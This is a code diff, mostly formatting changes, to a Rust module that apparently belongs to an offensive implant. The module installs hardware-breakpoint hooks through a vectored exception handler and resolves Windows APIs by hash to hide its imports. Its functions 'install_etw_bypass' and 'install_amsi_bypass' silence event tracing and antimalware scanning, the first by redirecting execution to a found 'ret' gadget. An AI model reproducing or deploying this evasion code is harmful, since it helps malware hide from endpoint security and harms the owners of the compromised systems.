@@ -337,7 +337,8 @@ unsafe extern "system" fn veh_handler(exception_info: *mut ExceptionPointers) ->
 
 /// Resolve `AddVectoredExceptionHandler` from kernel32 by hash.
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
-unsafe fn resolve_add_veh() -> Option<unsafe extern "system" fn(u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void> {
+unsafe fn resolve_add_veh(
+) -> Option<unsafe extern "system" fn(u32, *mut std::ffi::c_void) -> *mut std::ffi::c_void> {
     let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
     let hash = pe_resolve::hash_str(b"AddVectoredExceptionHandler\0");
     let addr = pe_resolve::get_proc_address_by_hash(k32, hash)?;
@@ -355,7 +356,8 @@ unsafe fn resolve_remove_veh() -> Option<unsafe extern "system" fn(*mut std::ffi
 
 /// Resolve `NtGetContextThread` from ntdll by hash.
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
-unsafe fn resolve_nt_get_context() -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
+unsafe fn resolve_nt_get_context(
+) -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
     let hash = pe_resolve::hash_str(b"NtGetContextThread\0");
     let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
@@ -364,7 +366,8 @@ unsafe fn resolve_nt_get_context() -> Option<unsafe extern "system" fn(usize, *m
 
 /// Resolve `NtSetContextThread` from ntdll by hash.
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
-unsafe fn resolve_nt_set_context() -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
+unsafe fn resolve_nt_set_context(
+) -> Option<unsafe extern "system" fn(usize, *mut crate::win_types::CONTEXT) -> i32> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
     let hash = pe_resolve::hash_str(b"NtSetContextThread\0");
     let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
@@ -373,7 +376,8 @@ unsafe fn resolve_nt_set_context() -> Option<unsafe extern "system" fn(usize, *m
 
 /// Resolve `NtOpenThread` from ntdll by hash.
 #[cfg(all(windows, feature = "hw-bp-hook", target_arch = "x86_64"))]
-unsafe fn resolve_nt_open_thread() -> Option<unsafe extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32> {
+unsafe fn resolve_nt_open_thread(
+) -> Option<unsafe extern "system" fn(*mut usize, u64, *mut u64, *mut u64) -> i32> {
     let ntdll = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL)?;
     let hash = pe_resolve::hash_str(b"NtOpenThread\0");
     let addr = pe_resolve::get_proc_address_by_hash(ntdll, hash)?;
@@ -433,10 +437,7 @@ unsafe fn ensure_veh() -> bool {
 
     // Register with high priority (first=1) so we see exceptions before
     // any other VEH handler.
-    let handle = add_veh(
-        1,
-        veh_handler as *mut std::ffi::c_void,
-    );
+    let handle = add_veh(1, veh_handler as *mut std::ffi::c_void);
 
     if handle.is_null() {
         tracing::error!("hw_bp_hook: AddVectoredExceptionHandler returned NULL");
@@ -459,7 +460,10 @@ unsafe fn ensure_veh() -> bool {
         }
     }
 
-    tracing::debug!("hw_bp_hook: VEH handler registered at {:#x}", veh_handler as *const () as usize);
+    tracing::debug!(
+        "hw_bp_hook: VEH handler registered at {:#x}",
+        veh_handler as *const () as usize
+    );
     true
 }
 
@@ -857,10 +861,11 @@ pub unsafe fn install_for_all_threads() -> bool {
         Some(a) => std::mem::transmute(a),
         None => return false,
     };
-    let thread32_first: Thread32FirstFn = match pe_resolve::get_proc_address_by_hash(k32, first_hash) {
-        Some(a) => std::mem::transmute(a),
-        None => return false,
-    };
+    let thread32_first: Thread32FirstFn =
+        match pe_resolve::get_proc_address_by_hash(k32, first_hash) {
+            Some(a) => std::mem::transmute(a),
+            None => return false,
+        };
     let thread32_next: Thread32NextFn = match pe_resolve::get_proc_address_by_hash(k32, next_hash) {
         Some(a) => std::mem::transmute(a),
         None => return false,
@@ -907,7 +912,12 @@ pub unsafe fn install_for_all_threads() -> bool {
             let mut client_id = [0u64; 2];
             client_id[1] = entry.thread_id as u64; // UniqueTid
 
-            let status = nt_open_thread(&mut handle, THREAD_CTX_ACCESS, &obj_attrs as *const _ as *mut _, client_id.as_mut_ptr() as *mut _);
+            let status = nt_open_thread(
+                &mut handle,
+                THREAD_CTX_ACCESS,
+                &obj_attrs as *const _ as *mut _,
+                client_id.as_mut_ptr() as *mut _,
+            );
 
             if status >= 0 && handle != 0 {
                 // Suspend the thread to safely modify its context.
@@ -983,7 +993,9 @@ pub unsafe fn cleanup() {
     };
 
     // Reprogram debug registers for current thread (clears Dr0–Dr3).
-    if let (Some(nt_get_ctx), Some(nt_set_ctx)) = (resolve_nt_get_context(), resolve_nt_set_context()) {
+    if let (Some(nt_get_ctx), Some(nt_set_ctx)) =
+        (resolve_nt_get_context(), resolve_nt_set_context())
+    {
         let current_thread = -2isize as usize;
         program_debug_regs_for_thread(current_thread, nt_get_ctx, nt_set_ctx);
     }
@@ -1106,9 +1118,9 @@ unsafe fn etw_bypass_callback(reg_ptr: *mut u64) -> bool {
     if gadget != 0 {
         // RIP is at offset +128 from RAX.
         let rip_ptr = reg_ptr.add(16); // Skip RAX..R15 = 16 registers × 8 bytes
-        // Actually the layout has more fields before RIP. Let's use ContextRegs offset.
-        // The reg_ptr is actually &mut (*context).rax. RIP is at ContextRegs.rip.
-        // From rax to rip: 16 reg fields × 8 bytes = 128 bytes.
+                                       // Actually the layout has more fields before RIP. Let's use ContextRegs offset.
+                                       // The reg_ptr is actually &mut (*context).rax. RIP is at ContextRegs.rip.
+                                       // From rax to rip: 16 reg fields × 8 bytes = 128 bytes.
         let rip_ptr = reg_ptr.add(128 / 8);
         *rip_ptr = gadget as u64;
     }
@@ -1146,8 +1158,8 @@ unsafe fn resolve_ret_gadget() -> bool {
     };
 
     // Try NtClose first — it's a small stub that often has a nearby `ret`.
-    let nt_close = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTCLOSE)
-        .unwrap_or(0);
+    let nt_close =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_NTCLOSE).unwrap_or(0);
     if nt_close != 0 {
         // Scan up to 32 bytes for a `ret` (0xC3).
         let ptr = nt_close as *const u8;
@@ -1161,11 +1173,9 @@ unsafe fn resolve_ret_gadget() -> bool {
     }
 
     // Fallback: try RtlGetCurrentPeb.
-    let peb_fn = pe_resolve::get_proc_address_by_hash(
-        ntdll,
-        pe_resolve::hash_str(b"RtlGetCurrentPeb\0"),
-    )
-    .unwrap_or(0);
+    let peb_fn =
+        pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::hash_str(b"RtlGetCurrentPeb\0"))
+            .unwrap_or(0);
     if peb_fn != 0 {
         let ptr = peb_fn as *const u8;
         for i in 0..16usize {
@@ -1213,7 +1223,8 @@ pub unsafe fn install_etw_bypass() -> bool {
     let mut installed = false;
 
     // Hook EtwEventWrite.
-    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE) {
+    if let Some(addr) = pe_resolve::get_proc_address_by_hash(ntdll, pe_resolve::HASH_ETWEVENTWRITE)
+    {
         // EtwEventWrite typically starts with `mov r10, rcx; mov eax, SSN`
         // which is 4C 8B D1 B8 — 4+ bytes.  The instruction at the entry
         // varies; we'll use instruction_size=0 and let the callback handle
@@ -1221,7 +1232,10 @@ pub unsafe fn install_etw_bypass() -> bool {
         match install_hw_bp(addr, etw_bypass_callback, 0) {
             Ok(_) => {
                 installed = true;
-                tracing::debug!("hw_bp_hook: ETW bypass installed on EtwEventWrite at {:#x}", addr);
+                tracing::debug!(
+                    "hw_bp_hook: ETW bypass installed on EtwEventWrite at {:#x}",
+                    addr
+                );
             }
             Err(e) => tracing::warn!("hw_bp_hook: failed to hook EtwEventWrite: {}", e),
         }
@@ -1232,7 +1246,10 @@ pub unsafe fn install_etw_bypass() -> bool {
         match install_hw_bp(addr, etw_bypass_callback, 0) {
             Ok(_) => {
                 installed = true;
-                tracing::debug!("hw_bp_hook: ETW bypass installed on NtTraceEvent at {:#x}", addr);
+                tracing::debug!(
+                    "hw_bp_hook: ETW bypass installed on NtTraceEvent at {:#x}",
+                    addr
+                );
             }
             Err(e) => tracing::debug!("hw_bp_hook: NtTraceEvent hook skipped: {}", e),
         }
@@ -1293,7 +1310,10 @@ pub unsafe fn install_amsi_bypass() -> bool {
 
     match install_hw_bp(scan_buf_addr, amsi_bypass_callback, 0) {
         Ok(_) => {
-            tracing::debug!("hw_bp_hook: AMSI bypass installed on AmsiScanBuffer at {:#x}", scan_buf_addr);
+            tracing::debug!(
+                "hw_bp_hook: AMSI bypass installed on AmsiScanBuffer at {:#x}",
+                scan_buf_addr
+            );
             install_for_all_threads();
             true
         }
@@ -1357,11 +1377,7 @@ mod tests {
         #[no_mangle]
         #[unsafe(naked)]
         unsafe extern "system" fn test_target() -> u32 {
-            std::arch::naked_asm!(
-                "xor eax, eax",
-                "inc eax",
-                "ret",
-            );
+            std::arch::naked_asm!("xor eax, eax", "inc eax", "ret",);
         }
 
         /// Callback that records it was called and sets RAX = 0x42.
